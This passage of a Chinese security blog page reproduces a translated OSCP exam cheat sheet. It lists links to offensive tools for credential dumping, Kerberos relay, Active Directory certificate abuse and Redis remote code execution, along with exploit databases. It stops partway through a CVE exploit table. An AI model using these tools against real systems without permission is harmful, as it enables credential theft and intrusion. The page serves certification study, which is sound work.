

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shiyan">
  <meta name="keywords" content="">
  
    <meta name="description" content="笔记说明：该笔记是国外进攻性爱好者 0xsyr0 在 github 上记录的备忘录，我整体翻译了注释的内容，并根据个人学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
<meta property="og:type" content="article">
<meta property="og:title" content="国外某进攻性安全证书-备忘录-2023.3.11版本">
<meta property="og:url" content="https://sh1yan.top/2024/06/01/Attack-certificate-memorandum-20230311-0xsyr0/index.html">
<meta property="og:site_name" content="sh1yan&#39;blog">
<meta property="og:description" content="笔记说明：该笔记是国外进攻性爱好者 0xsyr0 在 github 上记录的备忘录，我整体翻译了注释的内容，并根据个人学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-06-01T15:50:55.000Z">
<meta property="article:modified_time" content="2024-06-02T14:38:19.772Z">
<meta property="article:author" content="shiyan">
<meta property="article:tag" content="Offensive security">
<meta property="article:tag" content="Memo notes">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>国外某进攻性安全证书-备忘录-2023.3.11版本 - sh1yan&#39;blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>sh1yan&#39;blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/yqlj/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-th-large"></i>
                <span>其他</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="/open-source/" target="_self">
                    
                    <span>我开源的安全项目</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
                    
                    <span>反弹shell命令集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
                    
                    <span>简易反弹shell集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/P2note/" target="_self">
                    
                    <span>综合安全工具集合</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
                    
                    <span>网站开发者工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/linux-command/" target="_self">
                    
                    <span>Linux命令工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/CyberChef/" target="_self">
                    
                    <span>CyberChef工具箱</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
                    
                    <span>开发者速查备忘录</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="国外某进攻性安全证书-备忘录-2023.3.11版本"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-06-01 23:50" pubdate>
          2024年6月1日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          152k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          1268 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">国外某进攻性安全证书-备忘录-2023.3.11版本</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="笔记说明："><a href="#笔记说明：" class="headerlink" title="笔记说明："></a>笔记说明：</h1><p>该笔记是国外进攻性爱好者 0xsyr0 在 github 上记录的备忘录，我整体翻译了注释的内容，并根据个人学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。</p>
<span id="more"></span>  


<h1 id="OffSec-认证专业认证-OSCP-的命令、有效负载和资源。"><a href="#OffSec-认证专业认证-OSCP-的命令、有效负载和资源。" class="headerlink" title="OffSec 认证专业认证 (OSCP) 的命令、有效负载和资源。"></a>OffSec 认证专业认证 (OSCP) 的命令、有效负载和资源。</h1><h2 id="免责声明：推特上的一个人说得有道理。sqlmap考试中禁止使用此类自动利用工具。的自动利用功能也是如此LinPEAS。我没有跟踪与这些工具相关的当前指南。为此，我想指出，如果有人在没有仔细检查最新考试限制的情况下使用工具并导致考试失败，我不承担任何责任。参加考试前请先了解一下自己！"><a href="#免责声明：推特上的一个人说得有道理。sqlmap考试中禁止使用此类自动利用工具。的自动利用功能也是如此LinPEAS。我没有跟踪与这些工具相关的当前指南。为此，我想指出，如果有人在没有仔细检查最新考试限制的情况下使用工具并导致考试失败，我不承担任何责任。参加考试前请先了解一下自己！" class="headerlink" title="免责声明：推特上的一个人说得有道理。sqlmap考试中禁止使用此类自动利用工具。的自动利用功能也是如此LinPEAS。我没有跟踪与这些工具相关的当前指南。为此，我想指出，如果有人在没有仔细检查最新考试限制的情况下使用工具并导致考试失败，我不承担任何责任。参加考试前请先了解一下自己！"></a><strong>免责声明</strong>：推特上的一个人说得有道理。<code>sqlmap</code>考试中禁止使用此类自动利用工具。的自动利用功能也是如此<code>LinPEAS</code>。我没有跟踪与这些工具相关的当前指南。为此，我想指出，如果有人在没有仔细检查最新考试限制的情况下使用工具并导致考试失败，我不承担任何责任。参加考试前请先了解一下自己！</h2><h3 id="常用工具下载地址"><a href="#常用工具下载地址" class="headerlink" title="常用工具下载地址"></a>常用工具下载地址</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>chisel</td>
<td><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></td>
</tr>
<tr>
<td>CyberChef</td>
<td><a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef">https://gchq.github.io/CyberChef</a></td>
</tr>
<tr>
<td>ligolo-ng</td>
<td><a target="_blank" rel="noopener" href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a></td>
</tr>
<tr>
<td>swaks</td>
<td><a target="_blank" rel="noopener" href="https://github.com/jetmore/swaks">https://github.com/jetmore/swaks</a></td>
</tr>
</tbody></table>
<h3 id="信息收集工具"><a href="#信息收集工具" class="headerlink" title="信息收集工具"></a>信息收集工具</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>nmap</td>
<td><a target="_blank" rel="noopener" href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></td>
</tr>
</tbody></table>
<h3 id="漏洞分析工具"><a href="#漏洞分析工具" class="headerlink" title="漏洞分析工具"></a>漏洞分析工具</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>nikto</td>
<td><a target="_blank" rel="noopener" href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></td>
</tr>
<tr>
<td>sparta</td>
<td><a target="_blank" rel="noopener" href="https://github.com/SECFORCE/sparta">https://github.com/SECFORCE/sparta</a></td>
</tr>
</tbody></table>
<h3 id="网络应用分析工具"><a href="#网络应用分析工具" class="headerlink" title="网络应用分析工具"></a>网络应用分析工具</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>ffuf</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></td>
</tr>
<tr>
<td>fpmvuln</td>
<td><a target="_blank" rel="noopener" href="https://github.com/hannob/fpmvuln">https://github.com/hannob/fpmvuln</a></td>
</tr>
<tr>
<td>gobuster</td>
<td><a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></td>
</tr>
<tr>
<td>JSON 网络令牌</td>
<td><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io</a></td>
</tr>
<tr>
<td>JWT_工具</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></td>
</tr>
<tr>
<td>泄漏路径字典</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ayoubfathi/leaky-paths">https://github.com/ayoubfathi/leaky-paths</a></td>
</tr>
<tr>
<td>有效负载漏洞库</td>
<td><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></td>
</tr>
<tr>
<td>PHP 过滤器生成器</td>
<td><a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></td>
</tr>
<tr>
<td>PHPGGC</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></td>
</tr>
<tr>
<td>spose</td>
<td><a target="_blank" rel="noopener" href="https://github.com/aancw/spose">https://github.com/aancw/spose</a></td>
</tr>
<tr>
<td>wfuzz</td>
<td><a target="_blank" rel="noopener" href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></td>
</tr>
<tr>
<td>whatweb</td>
<td><a target="_blank" rel="noopener" href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td>
</tr>
<tr>
<td>wpscan</td>
<td><a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></td>
</tr>
</tbody></table>
<h3 id="数据库评估工具"><a href="#数据库评估工具" class="headerlink" title="数据库评估工具"></a>数据库评估工具</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>RedisModules-执行命令</td>
<td><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></td>
</tr>
<tr>
<td>Redis 远程代码执行</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></td>
</tr>
<tr>
<td>Redis 流氓服务器</td>
<td><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></td>
</tr>
</tbody></table>
<h3 id="密码攻击工具"><a href="#密码攻击工具" class="headerlink" title="密码攻击工具"></a>密码攻击工具</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>Crackmapexec</td>
<td><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></td>
</tr>
<tr>
<td>默认设备密码清单</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a></td>
</tr>
<tr>
<td>火狐密码解密工具</td>
<td><a target="_blank" rel="noopener" href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a></td>
</tr>
<tr>
<td>hashcat</td>
<td><a target="_blank" rel="noopener" href="https://hashcat.net/hashcat">https://hashcat.net/hashcat</a></td>
</tr>
<tr>
<td>hydra</td>
<td><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-Hydra</a></td>
</tr>
<tr>
<td>john</td>
<td><a target="_blank" rel="noopener" href="https://github.com/openwall/john">https://github.com/openwall/john</a></td>
</tr>
<tr>
<td>keepass-密码解密工具</td>
<td><a target="_blank" rel="noopener" href="https://github.com/CMEPW/keepass-dump-masterkey">https://github.com/CMEPW/keepass-dump-masterkey</a></td>
</tr>
<tr>
<td>keepwn-密码提取工具</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Orange-Cyberdefense/KeePwn">https://github.com/Orange-Cyberdefense/KeePwn</a></td>
</tr>
<tr>
<td>kerbrute</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></td>
</tr>
<tr>
<td>lazagne</td>
<td><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></td>
</tr>
<tr>
<td>mimikatz</td>
<td><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></td>
</tr>
<tr>
<td>netexec</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Pennyw0rth/NetExec">https://github.com/Pennyw0rth/NetExec</a></td>
</tr>
<tr>
<td>ntlm.pw</td>
<td><a target="_blank" rel="noopener" href="https://ntlm.pw/">https://ntlm.pw</a></td>
</tr>
<tr>
<td>pypykatz</td>
<td><a target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz">https://github.com/skelsec/pypykatz</a></td>
</tr>
</tbody></table>
<h3 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>evil-winrm</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></td>
</tr>
<tr>
<td>metasploit</td>
<td><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></td>
</tr>
</tbody></table>
<h3 id="内网域渗透工具"><a href="#内网域渗透工具" class="headerlink" title="内网域渗透工具"></a>内网域渗透工具</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>ADCSKiller</td>
<td><a target="_blank" rel="noopener" href="https://github.com/grimlockx/ADCSKiller">https://github.com/grimlockx/ADCSKiller</a></td>
</tr>
<tr>
<td>ADCS模板</td>
<td><a target="_blank" rel="noopener" href="https://github.com/GoateePFE/ADCSTemplate">https://github.com/GoateePFE/ADCSTemplate</a></td>
</tr>
<tr>
<td>AD_ Miner</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Mazars-Tech/AD_Miner">https://github.com/Mazars-Tech/AD_Miner</a></td>
</tr>
<tr>
<td>docker-bloodhound</td>
<td><a target="_blank" rel="noopener" href="https://github.com/belane/docker-bloodhound">https://github.com/belane/docker-bloodhound</a></td>
</tr>
<tr>
<td>bloodhound</td>
<td><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></td>
</tr>
<tr>
<td>bloodhound</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ly4k/BloodHound">https://github.com/ly4k/BloodHound</a></td>
</tr>
<tr>
<td>bloodhound.py</td>
<td><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/BloodHound.py">https://github.com/dirkjanm/BloodHound.py</a></td>
</tr>
<tr>
<td>certify</td>
<td><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Certify">https://github.com/GhostPack/Certify</a></td>
</tr>
<tr>
<td>certipy</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></td>
</tr>
<tr>
<td>enum4linux-ng</td>
<td><a target="_blank" rel="noopener" href="https://github.com/cddmp/enum4linux-ng">https://github.com/cddmp/enum4linux-ng</a></td>
</tr>
<tr>
<td>内网可执行利用工具集合</td>
<td><a target="_blank" rel="noopener" href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a></td>
</tr>
<tr>
<td>GTFOBins</td>
<td><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io</a></td>
</tr>
<tr>
<td>impacket</td>
<td><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></td>
</tr>
<tr>
<td>Impacket 源码</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ropnop/impacket_static_binaries">https://github.com/ropnop/impacket_static_binaries</a></td>
</tr>
<tr>
<td>jaws</td>
<td><a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">https://github.com/411Hall/JAWS</a></td>
</tr>
<tr>
<td>krbrelay</td>
<td><a target="_blank" rel="noopener" href="https://github.com/cube0x0/KrbRelay">https://github.com/cube0x0/KrbRelay</a></td>
</tr>
<tr>
<td>Krbrelayup</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Dec0ne/KrbRelayUp">https://github.com/Dec0ne/KrbRelayUp</a></td>
</tr>
<tr>
<td>krbrelayx</td>
<td><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx">https://github.com/dirkjanm/krbrelayx</a></td>
</tr>
<tr>
<td>lapsdumper</td>
<td><a target="_blank" rel="noopener" href="https://github.com/n00py/LAPSDumper">https://github.com/n00py/LAPSDumper</a></td>
</tr>
<tr>
<td>linux提权枚举工具</td>
<td><a target="_blank" rel="noopener" href="https://github.com/The-Z-Labs/linux-exploit-suggester">https://github.com/The-Z-Labs/linux-exploit-suggester</a></td>
</tr>
<tr>
<td>linenum</td>
<td><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></td>
</tr>
<tr>
<td>lsassy</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Hackndo/lsassy">https://github.com/Hackndo/lsassy</a></td>
</tr>
<tr>
<td>nanodump</td>
<td><a target="_blank" rel="noopener" href="https://github.com/helpsystems/nanodump">https://github.com/helpsystems/nanodump</a></td>
</tr>
<tr>
<td>passthecert</td>
<td><a target="_blank" rel="noopener" href="https://github.com/AlmondOffSec/PassTheCert">https://github.com/AlmondOffSec/PassTheCert</a></td>
</tr>
<tr>
<td>PEASS-ng</td>
<td><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></td>
</tr>
<tr>
<td>PKINIT工具</td>
<td><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PKINITtools">https://github.com/dirkjanm/PKINITtools</a></td>
</tr>
<tr>
<td>powercat</td>
<td><a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></td>
</tr>
<tr>
<td>powersharppack</td>
<td><a target="_blank" rel="noopener" href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack">https://github.com/S3cur3Th1sSh1t/PowerSharpPack</a></td>
</tr>
<tr>
<td>powerup.ps1</td>
<td><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></td>
</tr>
<tr>
<td>powerview.ps1</td>
<td><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></td>
</tr>
<tr>
<td>PowerView.py</td>
<td><a target="_blank" rel="noopener" href="https://github.com/aniqfakhrul/powerview.py">https://github.com/aniqfakhrul/powerview.py</a></td>
</tr>
<tr>
<td>PPLdump</td>
<td><a target="_blank" rel="noopener" href="https://github.com/itm4n/PPLdump">https://github.com/itm4n/PPLdump</a></td>
</tr>
<tr>
<td>Priv2admin</td>
<td><a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></td>
</tr>
<tr>
<td>PSPKIAaudit</td>
<td><a target="_blank" rel="noopener" href="https://github.com/GhostPack/PSPKIAudit">https://github.com/GhostPack/PSPKIAudit</a></td>
</tr>
<tr>
<td>pspy</td>
<td><a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></td>
</tr>
<tr>
<td>pth-toolkit</td>
<td><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/pth-toolkit">https://github.com/byt3bl33d3r/pth-toolkit</a></td>
</tr>
<tr>
<td>pwncat</td>
<td><a target="_blank" rel="noopener" href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a></td>
</tr>
<tr>
<td>pywhisker</td>
<td><a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/pywhisker">https://github.com/ShutdownRepo/pywhisker</a></td>
</tr>
<tr>
<td>rubeus</td>
<td><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></td>
</tr>
<tr>
<td>runascs</td>
<td><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RunasCs">https://github.com/antonioCoco/RunasCs</a></td>
</tr>
<tr>
<td>rusthound</td>
<td><a target="_blank" rel="noopener" href="https://github.com/OPENCYBER-FR/RustHound">https://github.com/OPENCYBER-FR/RustHound</a></td>
</tr>
<tr>
<td>scavenger</td>
<td><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/scavenger">https://github.com/SpiderLabs/scavenger</a></td>
</tr>
<tr>
<td>sharpadws</td>
<td><a target="_blank" rel="noopener" href="https://github.com/wh0amitz/SharpADWS">https://github.com/wh0amitz/SharpADWS</a></td>
</tr>
<tr>
<td>sharpcollection</td>
<td><a target="_blank" rel="noopener" href="https://github.com/Flangvik/SharpCollection">https://github.com/Flangvik/SharpCollection</a></td>
</tr>
<tr>
<td>sharpchromium</td>
<td><a target="_blank" rel="noopener" href="https://github.com/djhohnstein/SharpChromium">https://github.com/djhohnstein/SharpChromium</a></td>
</tr>
<tr>
<td>sharphound</td>
<td><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a></td>
</tr>
<tr>
<td>sharpview</td>
<td><a target="_blank" rel="noopener" href="https://github.com/tevora-threat/SharpView">https://github.com/tevora-threat/SharpView</a></td>
</tr>
<tr>
<td>sherlock</td>
<td><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></td>
</tr>
<tr>
<td>wadcoms</td>
<td><a target="_blank" rel="noopener" href="https://wadcoms.github.io/">https://wadcoms.github.io</a></td>
</tr>
<tr>
<td>watson</td>
<td><a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</a></td>
</tr>
<tr>
<td>wesng</td>
<td><a target="_blank" rel="noopener" href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a></td>
</tr>
<tr>
<td>whisker</td>
<td><a target="_blank" rel="noopener" href="https://github.com/eladshamir/Whisker">https://github.com/eladshamir/Whisker</a></td>
</tr>
<tr>
<td>Windows提权枚举工具</td>
<td><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/windows-privesc-check">https://github.com/pentestmonkey/windows-privesc-check</a></td>
</tr>
<tr>
<td>Windows 权限提升基础知识</td>
<td><a target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/tutorials/16.html">https://www.fuzzysecurity.com/tutorials/16.html</a></td>
</tr>
<tr>
<td>Windows 权限提升</td>
<td><a target="_blank" rel="noopener" href="https://github.com/frizb/Windows-Privilege-Escalation">https://github.com/frizb/Windows-Privilege-Escalation</a></td>
</tr>
</tbody></table>
<h3 id="漏洞利用数据库"><a href="#漏洞利用数据库" class="headerlink" title="漏洞利用数据库"></a>漏洞利用数据库</h3><table>
<thead>
<tr>
<th>数据库</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>0day.today 利用数据库</td>
<td><a target="_blank" rel="noopener" href="https://0day.today/">https://0day.today</a></td>
</tr>
<tr>
<td>利用数据库</td>
<td><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com</a></td>
</tr>
<tr>
<td>数据包风暴</td>
<td><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">https://packetstormsecurity.com</a></td>
</tr>
<tr>
<td>斯普洛图斯</td>
<td><a target="_blank" rel="noopener" href="https://sploitus.com/">https://sploitus.com</a></td>
</tr>
</tbody></table>
<h3 id="CVE漏洞利用工具"><a href="#CVE漏洞利用工具" class="headerlink" title="CVE漏洞利用工具"></a>CVE漏洞利用工具</h3><table>
<thead>
<tr>
<th>CVE</th>
<th>描述</th>
<th>网址</th>
</tr>
</thead>
<tbody><tr>
<td>CVE-2014-6271</td>
<td>令人震惊的RCE</td>
<td><a target="_blank" rel="noopener" href="https://github.com/nccgroup/shocker">https://github.com/nccgroup/shocker</a></td>
</tr>
<tr>
